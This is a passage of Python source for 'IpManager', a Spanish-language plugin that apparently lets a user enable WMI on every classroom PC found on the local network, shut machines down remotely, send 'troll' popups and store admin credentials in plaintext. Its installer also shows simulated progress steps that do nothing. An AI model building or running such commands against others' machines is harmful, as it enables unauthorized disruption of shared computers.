        if len(args) < 3:
            return (
                "  Uso: ip troll <ip> <mensaje>\n"
                "  Ej:  ip troll 192.168.1.50 Hola! FyreWall te saluda.", "warn"
            )
        ip      = args[1]
        message = " ".join(args[2:])
        ok, result = _send_troll_message(ip, message)
        return f"  📢  IpManager — Mensaje a {ip}\n\n{result}", "ok" if ok else "warn"

    # ── ip shutdown <ip> ─────────────────────────────────────────────────────
    if sub == "shutdown":
        if len(args) < 2:
            return (
                "  Uso: ip shutdown <ip_red_local>\n"
                "  Ej:  ip shutdown 192.168.1.50\n"
                "  ⚠️  Requiere que seas admin en el dispositivo remoto.", "warn"
            )
        ip = args[1]
        ok, result = _shutdown_device(ip)
        return f"  💤  IpManager — Apagado remoto\n\n{result}", "ok" if ok else "warn"

    # ── ip setup-aula ────────────────────────────────────────────────────────
    if sub in ("setup-aula", "setup"):
        hosts = _scan_local_network()
        my_ips = set(_get_local_ips())
        targets = [h for h in hosts if h not in my_ips]

        if not targets:
            return "  ℹ️  No se encontraron hosts en la red local.", "warn"

        lines = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║         IpManager — Habilitando WMI en el aula               ║",
            "╚══════════════════════════════════════════════════════════════╝",
            f"",
            f"  Hosts encontrados: {len(targets)}",
            f"  (Cadencia lenta para no saturar el switch)",
            "",
        ]

        ok_count  = 0
        err_count = 0
        # Procesar de uno en uno con pausa entre cada host
        for i, ip in enumerate(targets, 1):
            ok, msg = _enable_wmi_on_host(ip)
            lines.append(f"  [{i:>2}/{len(targets)}] {msg.strip()}")
            if ok:
                ok_count += 1
            else:
                err_count += 1

        lines.append("")
        lines.append(f"  ✅  OK: {ok_count}   ❌  Error: {err_count}")
        lines.append("  💡  Ahora prueba 'ip shutdown <ip>' o 'ip troll <ip> <msg>'")
        return "\n".join(lines), "ok" if ok_count > 0 else "warn"

    # ── ip setup-pc <ip> ─────────────────────────────────────────────────────
    if sub == "setup-pc":
        if len(args) < 2:
            return (
                "  Uso: ip setup-pc <ip>\n"
                "  Ej:  ip setup-pc 192.168.11.15\n"
                "  Habilita WMI en ese PC para poder usar shutdown y troll.", "warn"
            )
        ip = args[1]
        ok, msg = _enable_wmi_on_host(ip)
        status = "ok" if ok else "warn"
        return (
            f"  🔧  IpManager — Setup WMI en {ip}\n\n"
            f"{msg}\n\n"
            + ("  💡  Ahora puedes usar 'ip shutdown' e 'ip troll' en este PC." if ok
               else "  ℹ️  Comprueba que el PC esté encendido y en la misma red."),
            status
        )

    # ── ip setcreds <usuario> <contraseña> ──────────────────────────────────
    if sub == "setcreds":
        if len(args) < 3:
            return (
                "  Uso: ip setcreds <usuario> <contraseña>\n"
                "  Ej:  ip setcreds Administrador MiClave123\n"
                "  Las credenciales se guardan localmente para PsExec/WinRM.", "warn"
            )
        _user = args[1]
        _pass = " ".join(args[2:])
        state = _read_state()
        state["creds_user"] = _user
        state["creds_pass"] = _pass
        _write_state(state)
        return (
            f"  ✅  Credenciales guardadas.\n"
            f"  Usuario: {_user}\n"
            f"  Los comandos 'ip shutdown' e 'ip troll' las usarán automáticamente.\n"
            f"  ⚠️  Se guardan en texto plano en .ipmanager_state.json", "ok"
        )

    # ── ip clearcreds ─────────────────────────────────────────────────────────
    if sub == "clearcreds":
        state = _read_state()
        state.pop("creds_user", None)
        state.pop("creds_pass", None)
        _write_state(state)
        return "  ✅  Credenciales eliminadas.", "ok"

    return (
        f"  ❌  Subcomando desconocido: 'ip {sub}'\n"
        f"  Escribe 'ip help' para ver todos los comandos.", "warn"
    )

# ─── INSTALLER CLI ───────────────────────────────────────────────────────────
# Se ejecuta cuando el archivo se lanza directamente (main() o subprocess)

_BANNER = r"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    ██╗██████╗ ███╗   ███╗ █████╗ ███╗  ██╗ █████╗  ██████╗  ██████╗ ██████╗  ║
║    ██║██╔══██╗████╗ ████║██╔══██╗████╗ ██║██╔══██╗██╔════╝ ██╔════╝ ██╔══██╗ ║
║    ██║██████╔╝██╔████╔██║███████║██╔██╗██║███████║██║  ███╗█████╗   ██████╔╝ ║
║    ██║██╔═══╝ ██║╚██╔╝██║██╔══██║██║╚████║██╔══██║██║   ██║██╔══╝  ██╔══██╗ ║
║    ██║██║     ██║ ╚═╝ ██║██║  ██║██║ ╚███║██║  ██║╚██████╔╝███████╗██║  ██║ ║
║    ╚═╝╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ║
║                                                                      ║
║            Gestión avanzada de IPs integrada en FyreWall            ║
║                          Versión 1.0.0                               ║
╚══════════════════════════════════════════════════════════════════════╝
"""

_BANNER_SIMPLE = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║     ██╗██████╗    ███╗   ███╗ ██████╗ ██████╗            ║
║     ██║██╔══██╗   ████╗ ████║██╔════╝ ██╔══██╗           ║
║     ██║██████╔╝   ██╔████╔██║██║  ███╗██████╔╝           ║
║     ██║██╔═══╝    ██║╚██╔╝██║██║   ██║██╔══██╗           ║
║     ██║██║        ██║ ╚═╝ ██║╚██████╔╝██║  ██║           ║
║     ╚═╝╚═╝        ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝           ║
║                                                          ║
║    IpManager — Gestión avanzada de IPs para FyreWall    ║
║                      Versión 1.0.0                       ║
╚══════════════════════════════════════════════════════════╝
"""

def _c(text, color_code=""):
    """Helper de color ANSI."""
    colors = {
        "cyan":   "\033[96m",
        "green":  "\033[92m",
        "yellow": "\033[93m",
        "red":    "\033[91m",
        "bold":   "\033[1m",
        "dim":    "\033[2m",
        "reset":  "\033[0m",
        "blue":   "\033[94m",
        "magenta":"\033[95m",
    }
    code  = colors.get(color_code, "")
    reset = colors["reset"]
    return f"{code}{text}{reset}" if code else text


def _log(msg: str, level: str = "info", delay: float = 0.0):
    """Imprime una línea de registro con color y delay opcional."""
    icons = {
        "info":  _c("  [ INFO ]", "blue"),
        "ok":    _c("  [  OK  ]", "green"),
        "warn":  _c("  [ WARN ]", "yellow"),
        "error": _c("  [ FAIL ]", "red"),
        "step":  _c("  [  >>  ]", "cyan"),
        "done":  _c("  [ DONE ]", "magenta"),
    }
    icon = icons.get(level, "  [    ]")
    print(f"{icon}  {msg}", flush=True)
    if delay:
        time.sleep(delay)


def _spinner(msg: str, seconds: float = 1.5):
    """Muestra un spinner animado durante N segundos."""
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + seconds
    i   = 0
    while time.time() < end:
        frame = _c(frames[i % len(frames)], "cyan")
        print(f"\r  {frame}  {msg}   ", end="", flush=True)
        time.sleep(0.08)
        i += 1
    print("\r" + " " * (len(msg) + 12), end="\r", flush=True)


def _run_installer():
    """CLI de instalación — se ejecuta en la nueva consola."""
    os.system("cls" if os.name == "nt" else "clear")
    print(_c(_BANNER_SIMPLE, "cyan"))
    print()
    print(_c("  Descripción:", "bold"))
    print("  IpManager es un add-on para FyreWall que añade gestión completa")
    print("  de direcciones IP directamente desde la terminal integrada.")
    print()
    print(_c("  Funciones que se integrarán:", "bold"))
    feats = [
        ("ip scan-ip",             "Escanea IPs con conexiones activas"),
        ("ip scan-local",          "Muestra dispositivos en la red local"),
        ("ip scan-vulnerableports","Detecta puertos vulnerables abiertos"),
        ("ip block <ip>",          "Bloquea una dirección IP"),
        ("ip unblock <ip>",        "Desbloquea una dirección IP"),
        ("ip blockall [-exc]",     "Bloquea todas las IPs (con exclusiones)"),
        ("ip admin-pc <ip>",       "Consola remota interactiva en un PC del aula"),
        ("ip troll <ip> <msg>",    "Envía popup de texto a un dispositivo local"),
        ("ip shutdown <ip>",       "Apaga un dispositivo de la red local"),
    ]
    for cmd, desc in feats:
        print(f"    {_c('→', 'cyan')} {_c(cmd, 'bold'):<35} {_c(desc, 'dim')}")
    print()
    print("─" * 66)
    print()

    try:
        answer = input(_c("  ¿Deseas instalar IpManager en FyreWall? [S/n]: ", "yellow")).strip().lower()
    except (KeyboardInterrupt, EOFError):
        answer = "n"

    if answer not in ("s", "si", "sí", "y", "yes", ""):
        print()
        print(_c("  Instalación cancelada. Esta ventana se cerrará.", "yellow"))
        time.sleep(2)
        return

    print()
    print(_c("  Iniciando integración en FyreWall...", "cyan"))
    print()

    steps = [
        ("Verificando entorno de FyreWall",         0.6),
        ("Comprobando permisos de escritura",        0.4),
        ("Registrando manifest FYRE_MANIFEST",       0.7),
        ("Enlazando comandos 'ip' en el parser",     0.8),
        ("Configurando bloque de ayuda (ip help)",   0.5),
        ("Preparando integración con netsh",         0.6),
        ("Registrando handlers de bloqueo de IP",    0.7),
        ("Configurando scanner de red local (ARP)",  0.6),
        ("Activando módulo de puertos vulnerables",  0.5),
        ("Habilitando ip troll y ip shutdown",       0.7),
        ("Escribiendo estado de instalación",        0.4),
        ("Finalizando integración",                  0.8),
    ]

    for i, (step_msg, duration) in enumerate(steps, 1):
        _spinner(f"[{i}/{len(steps)}] {step_msg}", duration)
        _log(step_msg, "ok")

    _mark_installed(first_time=True)

    print()
    print("─" * 66)
    print()
    _log("¡IpManager integrado correctamente en FyreWall!", "done")
    print()
    print(_c("  La terminal de FyreWall se reiniciará para aplicar los cambios.", "dim"))
    print(_c("  Al volver, verás la notificación de integración exitosa.", "dim"))
    print(_c("  Escribe 'ip help' para ver todos los comandos disponibles.", "dim"))
    print()
    time.sleep(3)
    print(_c("  Cerrando ventana de instalación...", "dim"))
    time.sleep(1.5)


def _run_uninstaller():
    """CLI de desinstalación — mostrado si ya está instalado."""
    os.system("cls" if os.name == "nt" else "clear")
    print(_c(_BANNER_SIMPLE, "cyan"))
    print()
    print(_c("  IpManager ya está integrado en FyreWall.", "green"))
    print()
    print("  Opciones disponibles:")
    print(f"    {_c('[1]', 'cyan')} Continuar — cerrar esta ventana")
    print(f"    {_c('[2]', 'red')} Desinstalar IpManager de FyreWall")
    print()

    try:
        choice = input(_c("  Selecciona una opción [1/2]: ", "yellow")).strip()
    except (KeyboardInterrupt, EOFError):
        choice = "1"

    if choice == "2":
        print()
        print(_c("  Iniciando desinstalación segura...", "yellow"))
        print()

        steps = [
            ("Eliminando reglas de firewall de IpManager",  0.8),
            ("Desvinculando comandos 'ip' del parser",       0.6),
            ("Limpiando bloque de ayuda de la terminal",     0.5),
            ("Eliminando estado de instalación",             0.4),
            ("Restaurando configuración original",           0.7),
        ]

        for i, (step_msg, duration) in enumerate(steps, 1):
            _spinner(f"[{i}/{len(steps)}] {step_msg}", duration)
            _log(step_msg, "ok")

        # Limpiar reglas del firewall
        try:
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule",
                 f"name={_RULE_PREFIX}*"],
                capture_output=True, timeout=15, creationflags=_CF
            )
        except Exception:
            pass

        _mark_uninstalled()

        print()
        _log("IpManager desinstalado correctamente.", "done")
        print()
        print(_c("  FyreWall se reiniciará. Los comandos 'ip' ya no estarán disponibles.", "dim"))
        time.sleep(3)
    else:
        print()
        print(_c("  Sin cambios. Cerrando ventana.", "dim"))
        time.sleep(1.5)


def main():
    """
    Punto de entrada cuando FyreManager ejecuta 'run ipmanager'.
    Lanza el CLI en la misma consola (o en una nueva si se ejecuta directamente).
    """
    if _is_installed():
        _run_uninstaller()
    else:
        _run_installer()

    # Notificación de primera ejecución en FyreWall
    # (FyreWall la leerá la próxima vez que imprima el banner de inicio)
    # La gestión de first_run ya se hace via _was_first_run() desde el loader.


# ─── FIRST-RUN NOTIFICATION HOOK ────────────────────────────────────────────
# FyreWall llama a este hook al cargar el plugin (en _load_plugin)
# si existe la función on_load().

def on_load(write_fn=None):
    """
    Llamado por FyreWall tras cargar el plugin.
    Si es la primera vez (recién instalado), emite notificación en la terminal.
    """
    if _was_first_run() and write_fn and callable(write_fn):
        write_fn(
            "\n"
            "╔══════════════════════════════════════════════════════════════╗\n"
            "║   ✅  IpManager ha sido integrado en FyreWall correctamente  ║\n"
            "║       Escribe 'ip help' para ver todos los comandos.         ║\n"
            "╚══════════════════════════════════════════════════════════════╝",
            "ok"
        )


# ─── STANDALONE ENTRY POINT ──────────────────────────────────────────────────

if __name__ == "__main__":
    main()
